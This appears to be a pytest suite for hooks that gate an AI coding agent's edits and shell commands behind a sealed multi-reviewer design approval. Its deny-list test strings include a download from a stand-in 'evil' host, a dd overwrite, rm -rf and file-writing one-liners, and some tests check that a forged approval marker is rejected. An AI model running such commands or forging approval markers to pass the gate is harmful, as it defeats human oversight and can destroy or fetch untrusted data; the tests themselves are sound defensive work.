"""Tests for the consensus Claude Code hook layer (Track B, Tasks B2-B5).

Each hook script is exercised as a subprocess (the real Claude Code invocation
shape): a PreToolUse/Stop/SessionStart event JSON on stdin, assertions on exit
code + stdout/stderr. The consensus-runtime probe is controlled via the env
overrides the scripts honor (CONSENSUS_MCP_FORCE_RUNTIME_ABSENT / _PRESENT) so
the fail-open vs fail-closed branches are deterministic without touching PATH.

Verified hook semantics (cited in the deliverable):
  - PreToolUse blocks via exit code 2 + stderr reason (matches
    contrib/delivery_gate_pretooluse.py); exit 0 allows.
  - hooks.json schema matches Superpowers v5.1.0 hooks/hooks.json.
"""
from __future__ import annotations

import json
import os
import subprocess
import sys
from pathlib import Path

import pytest

from consensus_mcp import _delivery_readiness as dr
from consensus_mcp import _design_approval as da

_HOOKS_DIR = (
    Path(__file__).resolve().parent.parent / "claude_extensions" / "hooks"
)
PRETOOLUSE = _HOOKS_DIR / "consensus_pretooluse_gate.py"
STOP = _HOOKS_DIR / "consensus_stop_gate.py"
SESSIONSTART = _HOOKS_DIR / "consensus_sessionstart.py"
HOOKS_JSON = _HOOKS_DIR / "hooks.json"


def _run_hook(script: Path, event: dict, *, repo_root: Path,
              runtime: str = "present") -> subprocess.CompletedProcess:
    """Invoke a hook script with `event` on stdin. `runtime` in
    {"present","absent"} forces the runtime probe."""
    env = dict(os.environ)
    env["CONSENSUS_MCP_REPO_ROOT"] = str(repo_root)
    env.pop("CONSENSUS_MCP_FORCE_RUNTIME_ABSENT", None)
    env.pop("CONSENSUS_MCP_FORCE_RUNTIME_PRESENT", None)
    if runtime == "present":
        env["CONSENSUS_MCP_FORCE_RUNTIME_PRESENT"] = "1"
    elif runtime == "absent":
        env["CONSENSUS_MCP_FORCE_RUNTIME_ABSENT"] = "1"
    return subprocess.run(
        [sys.executable, str(script)],
        input=json.dumps(event),
        capture_output=True, text=True, env=env, timeout=60,
    )


def _make_sealed_iteration(repo_root: Path, ref: str = "iteration-fix-impl",
                           *, closing_state: str = "quorum_close_passed",
                           reviewers=("codex", "gemini")) -> str:
    """Build a genuine sealed cross-family iteration on disk so the marker pointer
    re-validates against a real T6 seal. Returns the converged-plan sha256."""
    iter_dir = repo_root / "consensus-state" / "active" / ref
    iter_dir.mkdir(parents=True, exist_ok=True)
    (iter_dir / "iteration-outcome.yaml").write_text(
        f"closing_state: {closing_state}\n", encoding="utf-8")
    plan = iter_dir / "converged-plan.yaml"
    plan.write_text("decision:\n  do: the thing\n", encoding="utf-8")
    for fam in reviewers:
        (iter_dir / f"{fam}-review.yaml").write_text(
            f"iteration_id: {ref}\nreviewer_id: {fam}-1\n", encoding="utf-8")
    return dr.compute_artifact_hash(plan)


def _seal_marker(repo_root: Path, scope_glob: str = "src/**",
                 *, sealed: bool = True) -> None:
    """Write a design-approval marker that points at a REAL sealed cross-family
    iteration when sealed=True; when sealed=False, forge a pointer at a non-sealed
    iteration (so the gate re-validation rejects it)."""
    (repo_root / ".consensus").mkdir(parents=True, exist_ok=True)
    if sealed:
        plan_sha = _make_sealed_iteration(repo_root, "iteration-fix-impl")
        da.mint_design_approval(
            repo_root=repo_root, design_consensus_ref="iteration-fix-impl",
            scope_glob=scope_glob, converged_plan_sha256=plan_sha,
        )
    else:
        import yaml as _yaml
        plan_sha = _make_sealed_iteration(
            repo_root, "iteration-open", closing_state="in_progress")
        (repo_root / ".consensus" / "design-approved").write_text(
            _yaml.safe_dump({
                "schema_version": 1,
                "design_consensus_ref": "iteration-open",
                "converged_plan_sha256": plan_sha,
                "scope_glob": scope_glob,
                "repo_root_id": "x",
            }, sort_keys=True), encoding="utf-8")


# --------------------------------------------------------------------------- #
# Task B2 — PreToolUse design gate
# --------------------------------------------------------------------------- #

def test_pretooluse_edit_no_marker_denies(tmp_path):
    ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, cp.stderr
    assert "consensus" in cp.stderr.lower()


def test_pretooluse_edit_valid_in_scope_allows(tmp_path):
    _seal_marker(tmp_path, scope_glob="src/**")
    ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, cp.stderr


def test_pretooluse_edit_out_of_scope_denies(tmp_path):
    _seal_marker(tmp_path, scope_glob="src/**")
    ev = {"tool_name": "Write", "tool_input": {"file_path": "docs/y.md"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, cp.stderr


def test_pretooluse_forged_unsealed_marker_denies(tmp_path):
    # FORGE: a hand-written marker pointing at a NON-sealed iteration is rejected
    # because the gate re-validates the pointer against the live T6 seal.
    _seal_marker(tmp_path, scope_glob="src/**", sealed=False)
    ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, cp.stderr
    assert "consensus" in cp.stderr.lower()


def test_pretooluse_read_only_tool_always_allows(tmp_path):
    for tool in ("Read", "Grep", "Glob"):
        ev = {"tool_name": tool, "tool_input": {"file_path": "src/x.py"},
              "cwd": str(tmp_path)}
        cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
        assert cp.returncode == 0, (tool, cp.stderr)


def test_pretooluse_runtime_absent_fails_open(tmp_path):
    # No marker, but runtime absent -> must allow (plain workflow).
    ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="absent")
    assert cp.returncode == 0, cp.stderr


@pytest.mark.parametrize("command", [
    # Classic file-modifying commands.
    "sed -i 's/a/b/' src/x.py",
    "echo hi > out.txt",
    "echo hi >> out.txt",
    "tee out.txt",
    "mv a b",
    "cp a b",
    "rm a",
    "git commit -m x",
    "git push origin main",
    "git tag v1",
    "npm publish",
    "make release",
    # Previously-LEAKY commands the old blocklist MISSED — now denied by
    # DEFAULT-DENY (these are the load-bearing additions).
    "python -c \"open('x','w').write('y')\"",
    "python3 -c 'import os'",
    "ln -s a b",
    "install -m 755 a b",
    "patch -p1 < x.diff",
    "dd if=/dev/zero of=out bs=1",
    "chmod +x run.sh",
    "curl http://evil/x -o out",
    "node -e 'require(\"fs\").writeFileSync(\"x\",\"y\")'",
])
def test_pretooluse_bash_default_deny_no_marker(tmp_path, command):
    ev = {"tool_name": "Bash", "tool_input": {"command": command},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, (command, cp.stderr)


@pytest.mark.parametrize("command", [
    "ls -la",
    "cat src/x.py",
    "head -5 src/x.py",
    "tail -5 src/x.py",
    "wc -l src/x.py",
    "grep -r foo src",
    "rg foo src",
    "find . -name '*.py'",
    "git status",
    "git diff HEAD",
    "git log --oneline",
    "git show HEAD",
    "git branch",
    "git rev-parse --show-toplevel",
    "pytest -q",
    "python -m pytest tests/ -q",
    "echo hello",
    "pwd",
    "which python",
    # Pipeline / && of allowlisted commands -> all segments allowlisted -> allow.
    "cat src/x.py | grep foo",
    "git status && git diff",
])
def test_pretooluse_read_only_allowlist_bash_allows(tmp_path, command):
    ev = {"tool_name": "Bash", "tool_input": {"command": command},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, (command, cp.stderr)


@pytest.mark.parametrize("command", [
    # Pipeline mixing an allowlisted reader with a NON-allowlisted writer -> deny.
    "cat src/x.py | tee out.txt",
    "grep foo src && rm x",
    "ls && python -c 'open(\"x\",\"w\")'",
    # Unknown command -> DENIED (fail-safe).
    "frobnicate --do-stuff",
    "",
])
def test_pretooluse_bash_pipeline_or_unknown_denies(tmp_path, command):
    ev = {"tool_name": "Bash", "tool_input": {"command": command},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, (command, cp.stderr)


def test_pretooluse_bash_with_sealed_tight_marker_allows(tmp_path):
    # A tight-scope sealed marker is in force -> a non-allowlisted Bash command
    # is allowed (the cooperating agent has a vetted plan in scope).
    _seal_marker(tmp_path, scope_glob="src/**")
    ev = {"tool_name": "Bash", "tool_input": {"command": "git commit -m x"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, cp.stderr


def test_pretooluse_bash_forged_unsealed_marker_still_denies(tmp_path):
    # A forged marker pointing at a non-sealed iteration does NOT enable Bash.
    _seal_marker(tmp_path, scope_glob="src/**", sealed=False)
    ev = {"tool_name": "Bash", "tool_input": {"command": "git commit -m x"},
          "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, cp.stderr


def test_pretooluse_malformed_payload_fails_open(tmp_path):
    env = dict(os.environ)
    env["CONSENSUS_MCP_REPO_ROOT"] = str(tmp_path)
    env["CONSENSUS_MCP_FORCE_RUNTIME_PRESENT"] = "1"
    cp = subprocess.run(
        [sys.executable, str(PRETOOLUSE)], input="not json{{",
        capture_output=True, text=True, env=env, timeout=60,
    )
    assert cp.returncode == 0, cp.stderr


# --------------------------------------------------------------------------- #
# Task B3 — Stop verification soft-gate
# --------------------------------------------------------------------------- #

def _git_repo_with_modified_source(tmp_path: Path, rel: str = "src/app.py") -> Path:
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    subprocess.run(["git", "config", "user.email", "t@t"], cwd=tmp_path, check=True)
    subprocess.run(["git", "config", "user.name", "t"], cwd=tmp_path, check=True)
    src = tmp_path / rel
    src.parent.mkdir(parents=True, exist_ok=True)
    src.write_text("print('v1')\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=tmp_path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "init"], cwd=tmp_path, check=True)
    # Modify after HEAD so `git diff --name-only HEAD` reports it.
    src.write_text("print('v2')\n", encoding="utf-8")
    return src


def test_stop_modified_source_without_token_emits_directive(tmp_path):
    src = _git_repo_with_modified_source(tmp_path, "src/app.py")
    ev = {"hook_event_name": "Stop", "cwd": str(tmp_path)}
    cp = _run_hook(STOP, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, cp.stderr
    assert "STOP" in cp.stdout
    assert "src/app.py" in cp.stdout


def test_stop_modified_source_with_token_no_directive(tmp_path):
    src = _git_repo_with_modified_source(tmp_path, "src/app.py")
    # Mint a valid delivery token for the modified file.
    seal_dir = tmp_path / "consensus-state" / "active" / "iteration-x"
    seal_dir.mkdir(parents=True, exist_ok=True)
    (seal_dir / "iteration-outcome.yaml").write_text(
        "closing_state: quorum_close_passed\n", encoding="utf-8")
    dr.mint_delivery_token(
        src, design_consensus_ref="iteration-x",
        vetted_by=["codex", "gemini"], repo_root=tmp_path)
    ev = {"hook_event_name": "Stop", "cwd": str(tmp_path)}
    cp = _run_hook(STOP, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, cp.stderr
    assert "STOP" not in cp.stdout, cp.stdout


def test_stop_runtime_absent_noop(tmp_path):
    _git_repo_with_modified_source(tmp_path, "src/app.py")
    ev = {"hook_event_name": "Stop", "cwd": str(tmp_path)}
    cp = _run_hook(STOP, ev, repo_root=tmp_path, runtime="absent")
    assert cp.returncode == 0
    assert cp.stdout.strip() == "", cp.stdout


def test_stop_ignores_test_files(tmp_path):
    # A modified TEST file (not source) must not trigger the directive.
    _git_repo_with_modified_source(tmp_path, "tests/test_app.py")
    ev = {"hook_event_name": "Stop", "cwd": str(tmp_path)}
    cp = _run_hook(STOP, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0
    assert "STOP" not in cp.stdout, cp.stdout


# --------------------------------------------------------------------------- #
# v1.21 (L1) — Stop gate also catches COMMITTED-but-unverified files.
# --------------------------------------------------------------------------- #

def _git_repo_with_committed_source(tmp_path: Path, rel: str = "src/app.py") -> Path:
    """Make a repo where the source change is COMMITTED (clean working tree).

    `git diff --name-only HEAD` is therefore EMPTY; only `git show` reveals the
    file. This is the L1 bug: a step that commits its change leaves the
    working-tree diff empty yet the committed source is still unverified.
    """
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    subprocess.run(["git", "config", "user.email", "t@t"], cwd=tmp_path, check=True)
    subprocess.run(["git", "config", "user.name", "t"], cwd=tmp_path, check=True)
    # An initial unrelated commit so HEAD exists before the source commit.
    readme = tmp_path / "README.md"
    readme.write_text("# repo\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=tmp_path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "init"], cwd=tmp_path, check=True)
    src = tmp_path / rel
    src.parent.mkdir(parents=True, exist_ok=True)
    src.write_text("print('committed v1')\n", encoding="utf-8")
    subprocess.run(["git", "add", "-A"], cwd=tmp_path, check=True)
    subprocess.run(["git", "commit", "-q", "-m", "add source"], cwd=tmp_path, check=True)
    return src


def test_stop_committed_source_without_token_emits_directive(tmp_path):
    src = _git_repo_with_committed_source(tmp_path, "src/app.py")
    # Working tree is clean: the old diff-only check would miss this entirely.
    diff = subprocess.run(["git", "diff", "--name-only", "HEAD"],
                          cwd=tmp_path, capture_output=True, text=True)
    assert diff.stdout.strip() == "", "precondition: working tree must be clean"

    ev = {"hook_event_name": "Stop", "cwd": str(tmp_path)}
    cp = _run_hook(STOP, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, cp.stderr
    assert "STOP" in cp.stdout, cp.stdout
    assert "src/app.py" in cp.stdout, cp.stdout


# --------------------------------------------------------------------------- #
# v1.21 (L2) — Stop gate must NOT crash when verify_delivery_token raises.
# --------------------------------------------------------------------------- #

def test_stop_does_not_crash_when_verify_raises(tmp_path, monkeypatch):
    """L2: an exception in verify_delivery_token is caught (fail-soft); the hook
    exits 0 and treats the file as unverified rather than crashing."""
    import importlib.util
    import io

    _git_repo_with_modified_source(tmp_path, "src/app.py")

    spec = importlib.util.spec_from_file_location(
        "consensus_stop_gate_under_test", STOP)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)

    monkeypatch.setenv("CONSENSUS_MCP_FORCE_RUNTIME_PRESENT", "1")
    monkeypatch.setenv("CONSENSUS_MCP_REPO_ROOT", str(tmp_path))

    # The gate imports _delivery_readiness lazily inside main(); patch the
    # attribute on the imported module so the gate sees the exploding version.
    monkeypatch.setattr(
        dr, "verify_delivery_token",
        lambda *a, **k: (_ for _ in ()).throw(RuntimeError("boom")))

    monkeypatch.setattr(
        mod.sys, "stdin",
        io.StringIO(json.dumps({"hook_event_name": "Stop", "cwd": str(tmp_path)})))
    captured: list[str] = []
    monkeypatch.setattr(
        mod, "print",
        lambda *a, **k: captured.append(" ".join(map(str, a))),
        raising=False)

    rc = mod.main()
    assert rc == 0  # did not crash
    out = "\n".join(captured)
    assert "STOP" in out, out
    assert "src/app.py" in out, out


# --------------------------------------------------------------------------- #
# v1.21 (H2) — Stop gate resolves repo root from a SUBDIRECTORY via git rev-parse.
# --------------------------------------------------------------------------- #

def test_stop_resolves_repo_root_from_subdir(tmp_path):
    """H2: when the event cwd is a SUBDIR, the gate must climb to the git
    toplevel. If it treated the subdir as repo root, `artifact = repo_root/rel`
    would not exist and NO directive would fire — so an emitted directive
    naming the repo-relative file proves the toplevel was resolved."""
    _git_repo_with_modified_source(tmp_path, "src/app.py")
    subdir = tmp_path / "src"  # a real subdir of the repo
    env = dict(os.environ)
    env["CONSENSUS_MCP_REPO_ROOT"] = str(subdir)  # subdir override -> must climb
    env.pop("CONSENSUS_MCP_FORCE_RUNTIME_ABSENT", None)
    env["CONSENSUS_MCP_FORCE_RUNTIME_PRESENT"] = "1"
    cp = subprocess.run(
        [sys.executable, str(STOP)],
        input=json.dumps({"hook_event_name": "Stop", "cwd": str(subdir)}),
        capture_output=True, text=True, env=env, timeout=60,
    )
    assert cp.returncode == 0, cp.stderr
    assert "src/app.py" in cp.stdout, cp.stdout


# --------------------------------------------------------------------------- #
# Task B4 — SessionStart precedence injector + UserPromptSubmit nudge
# --------------------------------------------------------------------------- #

def test_sessionstart_runtime_present_injects_precedence(tmp_path):
    ev = {"hook_event_name": "SessionStart", "source": "startup",
          "cwd": str(tmp_path)}
    cp = _run_hook(SESSIONSTART, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0, cp.stderr
    out = json.loads(cp.stdout)
    ctx = out["hookSpecificOutput"]["additionalContext"]
    assert out["hookSpecificOutput"]["hookEventName"] == "SessionStart"
    low = ctx.lower()
    assert "workflow a" in low
    assert "workflow b" in low
    assert "delivery" in low
    assert ".consensus/design-approved" in ctx
    assert "precedence" in low


def test_sessionstart_runtime_absent_benign_notice(tmp_path):
    ev = {"hook_event_name": "SessionStart", "source": "startup",
          "cwd": str(tmp_path)}
    cp = _run_hook(SESSIONSTART, ev, repo_root=tmp_path, runtime="absent")
    assert cp.returncode == 0
    out = json.loads(cp.stdout)
    ctx = out["hookSpecificOutput"]["additionalContext"].lower()
    assert "not detected" in ctx
    assert "plain workflow" in ctx


# --------------------------------------------------------------------------- #
# v1.21 (H2) — SessionStart resolves repo root from a SUBDIRECTORY via rev-parse.
# --------------------------------------------------------------------------- #

def test_sessionstart_resolves_repo_root_from_subdir(tmp_path):
    """H2: a session opened from a subdir must anchor to the git toplevel, not
    the subdir. The resolved repo root is injected into the precedence context;
    assert it equals the toplevel (the real_repo, resolved through symlinks),
    not the subdir."""
    subprocess.run(["git", "init", "-q"], cwd=tmp_path, check=True)
    subdir = tmp_path / "pkg" / "sub"
    subdir.mkdir(parents=True)
    # Open the session from the subdir (both the override and event cwd).
    env = dict(os.environ)
    env["CONSENSUS_MCP_REPO_ROOT"] = str(subdir)
    env.pop("CONSENSUS_MCP_FORCE_RUNTIME_ABSENT", None)
    env["CONSENSUS_MCP_FORCE_RUNTIME_PRESENT"] = "1"
    cp = subprocess.run(
        [sys.executable, str(SESSIONSTART)],
        input=json.dumps({"hook_event_name": "SessionStart", "source": "startup",
                          "cwd": str(subdir)}),
        capture_output=True, text=True, env=env, timeout=60,
    )
    assert cp.returncode == 0, cp.stderr
    ctx = json.loads(cp.stdout)["hookSpecificOutput"]["additionalContext"]
    # The git toplevel is tmp_path (resolved for any symlinks, e.g. macOS /tmp).
    toplevel = str(Path(tmp_path).resolve())
    assert f"Repo root (consensus scope): {toplevel}" in ctx, ctx
    # And NOT the subdir.
    assert str(subdir) not in ctx, ctx


def test_userpromptsubmit_nudge_present(tmp_path):
    ev = {"hook_event_name": "UserPromptSubmit", "cwd": str(tmp_path)}
    cp = _run_hook(SESSIONSTART, ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 0
    out = json.loads(cp.stdout)
    assert out["hookSpecificOutput"]["hookEventName"] == "UserPromptSubmit"
    assert "consensus" in out["hookSpecificOutput"]["additionalContext"].lower()


def test_userpromptsubmit_runtime_absent_noop(tmp_path):
    ev = {"hook_event_name": "UserPromptSubmit", "cwd": str(tmp_path)}
    cp = _run_hook(SESSIONSTART, ev, repo_root=tmp_path, runtime="absent")
    assert cp.returncode == 0
    assert cp.stdout.strip() == "", cp.stdout


# --------------------------------------------------------------------------- #
# Task B5 — hooks.json manifest + degradation integration test
# --------------------------------------------------------------------------- #

def test_hooks_json_schema_matches_superpowers_shape():
    data = json.loads(HOOKS_JSON.read_text(encoding="utf-8"))
    assert set(data) == {"hooks"}
    hooks = data["hooks"]
    for event in ("SessionStart", "UserPromptSubmit", "PreToolUse", "Stop"):
        assert event in hooks, event
        groups = hooks[event]
        assert isinstance(groups, list) and groups
        for grp in groups:
            assert "matcher" in grp
            assert isinstance(grp["hooks"], list) and grp["hooks"]
            for h in grp["hooks"]:
                assert h["type"] == "command"
                assert "command" in h and h["command"]
    # PreToolUse matcher covers the gated tools.
    matcher = hooks["PreToolUse"][0]["matcher"]
    for tool in ("Edit", "Write", "MultiEdit", "NotebookEdit", "Bash"):
        assert tool in matcher, (tool, matcher)
    # Each registered command points at an existing script.
    for event, groups in hooks.items():
        for grp in groups:
            for h in grp["hooks"]:
                ref = h["command"]
                for name in ("consensus_sessionstart.py", "consensus_pretooluse_gate.py",
                             "consensus_stop_gate.py"):
                    if name in ref:
                        assert (_HOOKS_DIR / name).exists(), name


def test_integration_runtime_absent_all_gates_noop(tmp_path):
    # No marker, modified source, etc. — with runtime absent EVERY gate is a
    # no-op (plain workflow, never worse).
    edit_ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"},
               "cwd": str(tmp_path)}
    assert _run_hook(PRETOOLUSE, edit_ev, repo_root=tmp_path,
                     runtime="absent").returncode == 0

    bash_ev = {"tool_name": "Bash", "tool_input": {"command": "rm -rf x"},
               "cwd": str(tmp_path)}
    assert _run_hook(PRETOOLUSE, bash_ev, repo_root=tmp_path,
                     runtime="absent").returncode == 0

    _git_repo_with_modified_source(tmp_path, "src/app.py")
    stop_ev = {"hook_event_name": "Stop", "cwd": str(tmp_path)}
    stop_cp = _run_hook(STOP, stop_ev, repo_root=tmp_path, runtime="absent")
    assert stop_cp.returncode == 0 and stop_cp.stdout.strip() == ""

    ss_ev = {"hook_event_name": "SessionStart", "source": "startup",
             "cwd": str(tmp_path)}
    ss_cp = _run_hook(SESSIONSTART, ss_ev, repo_root=tmp_path, runtime="absent")
    ss_ctx = json.loads(ss_cp.stdout)["hookSpecificOutput"]["additionalContext"].lower()
    assert "plain workflow" in ss_ctx


def test_integration_runtime_present_no_marker_pretooluse_denies(tmp_path):
    edit_ev = {"tool_name": "Edit", "tool_input": {"file_path": "src/x.py"},
               "cwd": str(tmp_path)}
    cp = _run_hook(PRETOOLUSE, edit_ev, repo_root=tmp_path, runtime="present")
    assert cp.returncode == 2, cp.stderr
